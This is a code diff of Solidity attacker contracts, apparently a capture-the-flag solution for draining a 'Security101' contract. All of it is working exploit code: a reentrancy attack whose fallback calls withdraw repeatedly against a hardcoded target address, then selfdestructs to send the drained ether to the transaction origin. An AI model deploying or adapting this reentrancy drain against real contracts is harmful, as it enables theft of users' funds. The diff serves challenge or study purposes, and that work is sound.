@@ -22,19 +22,22 @@ contract Security101 {
 // https://ethereum.stackexchange.com/questions/29469/is-addressthis-a-valid-address-in-a-contracts-constructor
 // in order to `receive` callback, we have to add a new contract and attack outside constructor
 contract AttackerMiddle {
-    constructor(address token) payable {
+    address constant token = 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f;
+    constructor() payable {
         Security101(token).deposit{value: msg.value}();
     }
 
-    function attack(address token, uint i) public payable {
+    function attack(uint i) public payable {
         Security101(token).withdraw(i);
     }
 
     fallback() external payable {
-        if (msg.value == address(this).balance) {
-            attack(msg.sender, msg.value);
-        } else if (msg.sender.balance == 0) {
+        if (msg.value == 0) {
+            attack(gasleft());
+            attack(address(token).balance);
             selfdestruct(payable(tx.origin));
+        } else if (msg.value == address(this).balance) {
+            attack(msg.value);
         }
     }
 }
@@ -42,9 +45,8 @@ contract AttackerMiddle {
 // when selfdestruct, nothing would write to code, saving gas.
 contract OptimizedAttackerSecurity101 {
     constructor(address token) payable {
-        AttackerMiddle tmp = new AttackerMiddle{value: msg.value}(token);
-        tmp.attack(token, msg.value);
-        tmp.attack(token, token.balance);
+        OptimizedAttackerSecurity101(address(new AttackerMiddle{value: 50000}())).attack{gas: 50000}();
         selfdestruct(payable(tx.origin));
     }
+    function attack() external {}
 }
